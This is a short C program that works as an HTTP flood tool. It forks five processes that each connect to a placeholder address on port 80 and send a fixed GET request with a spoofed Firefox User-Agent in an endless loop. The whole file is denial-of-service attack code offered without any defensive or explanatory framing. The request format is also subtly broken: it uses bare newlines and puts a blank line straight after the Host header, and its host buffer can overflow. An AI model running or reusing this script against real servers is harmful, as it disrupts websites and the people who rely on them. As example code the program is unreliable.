#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define THREADS 5
#define MSGSIZE 2048
#define BUFSIZE (MSGSIZE + 1)

void make_send_buff(char* send_buff, char *addr)
{
    char *format = "%s\n%s\n\n%s\n%s\n%s\n%s\n%s\n%s\n%s";

    char host[20];        sprintf(host, "Host: %s", addr);
    char *method          = "GET / HTTP/1.1";
    char *user_agent      = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1";
    char *accept          = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    char *accept_language = "Accept-Language: en-us,en;q=0.5";
    char *accept_encoding = "Accept-Encoding: gzip,deflate";
    char *accept_charset  = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    char *keep_alive      = "Keep-Alive: 115";
    char *connection      = "Connection: keep-alive";

    sprintf(
        send_buff,
        format,
        method,
        host,
        user_agent,
        accept,
        accept_language,
        accept_encoding,
        accept_charset,
        keep_alive,
        connection
    );
}

int main(int argc, char* argv[])
{
    int i;
    int sock;
    struct sockaddr_in sockaddr;
    char send_buff[BUFSIZE];
    make_send_buff(send_buff, "XXX.XXX.XX.XX");

    // printf("%s\n", send_buff);

    for (i = 0; i < THREADS; ++i)
    {
        if (fork() == 0) break;
    }

    memset(&sockaddr, 0, sizeof(sockaddr));

    sockaddr.sin_family = AF_INET;

    // set host, port
    inet_aton("XXX.XXX.XX.XX", &sockaddr.sin_addr);
    sockaddr.sin_port = htons((unsigned short) atoi("80"));

    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connect(sock, (struct sockaddr*) &sockaddr, sizeof(sockaddr)) != 0)
    {
        perror("failed to connect server");
        return EXIT_FAILURE;
    }

    printf("connect to %s\n", inet_ntoa(sockaddr.sin_addr));

    while(1)
    {
        send(sock, send_buff, strlen(send_buff), 0);
    }

    return EXIT_SUCCESS;
}